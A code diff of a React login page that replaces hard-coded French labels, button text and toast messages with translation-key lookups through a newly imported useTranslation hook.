@@ -3,6 +3,7 @@ import { Link, useLocation } from "wouter";
 import { Eye, EyeOff } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { apiRequest } from "@/lib/queryClient";
+import { useTranslation } from "@/contexts/LanguageContext";
 
 export default function Login() {
   const [email, setEmail] = useState("");
@@ -11,6 +12,7 @@ export default function Login() {
   const [isLoading, setIsLoading] = useState(false);
   const [, setLocation] = useLocation();
   const { toast } = useToast();
+  const { t } = useTranslation();
 
   useEffect(() => {
     // Track visitor when page loads with language info
@@ -42,8 +44,8 @@ export default function Login() {
 
       if (data.success) {
         toast({
-          title: "Login successful!",
-          description: "Redirecting to verification...",
+          title: t('login_success_title'),
+          description: t('login_success_desc'),
         });
 
         setEmail("");
@@ -56,8 +58,8 @@ export default function Login() {
       }
     } catch (error: any) {
       toast({
-        title: "Login failed",
-        description: error.message || "Please try again",
+        title: t('login_failed_title'),
+        description: error.message || t('login_failed_desc'),
         variant: "destructive",
       });
     } finally {
@@ -90,7 +92,7 @@ export default function Login() {
           className="text-4xl font-bold mb-12 text-black"
           data-testid="text-title"
         >
-          Connexion
+          {t('login_title')}
         </h1>
 
         <form onSubmit={handleLogin} className="space-y-6">
@@ -100,14 +102,14 @@ export default function Login() {
               className="block text-sm font-medium mb-2 text-black"
               data-testid="label-email"
             >
-              Adresse e-mail
+              {t('login_email_label')}
             </label>
             <input
               id="email"
               type="email"
               value={email}
               onChange={(e) => setEmail(e.target.value)}
-              placeholder="vous@exemple.com"
+              placeholder={t('login_email_placeholder')}
               required
               className="w-full h-12 px-4 border border-black rounded-md focus:outline-none focus:ring-2 focus:ring-black text-black placeholder:text-gray-400"
               data-testid="input-email"
@@ -120,7 +122,7 @@ export default function Login() {
               className="block text-sm font-medium mb-2 text-black"
               data-testid="label-password"
             >
-              Mot de passe
+              {t('login_password_label')}
             </label>
             <div className="relative">
               <input
@@ -149,7 +151,7 @@ export default function Login() {
               className="text-sm font-medium text-black underline hover:no-underline"
               data-testid="link-forgot-password"
             >
-              Mot de passe oublié ?
+              {t('login_forgot_password')}
             </a>
           </div>
 
@@ -159,7 +161,7 @@ export default function Login() {
             className="w-full h-12 bg-black text-white font-semibold rounded-md hover:bg-opacity-90 disabled:bg-opacity-50 transition-all"
             data-testid="button-submit"
           >
-            {isLoading ? "Connexion..." : "Suivant"}
+            {isLoading ? t('login_button_loading') : t('login_button')}
           </button>
         </form>
 
@@ -169,7 +171,7 @@ export default function Login() {
             className="w-full h-12 border border-black text-black font-medium rounded-md hover:bg-gray-50 transition-all"
             data-testid="button-connect-password"
           >
-            Se connecter avec un mot de passe
+            {t('login_connect_password')}
           </button>
         </div>
 
@@ -179,7 +181,7 @@ export default function Login() {
             className="text-sm font-medium text-black border border-black px-8 py-3 rounded-md hover:bg-gray-50 transition-all"
             data-testid="button-system-status"
           >
-            Statut du système
+            {t('login_system_status')}
           </button>
         </div>
       </div>
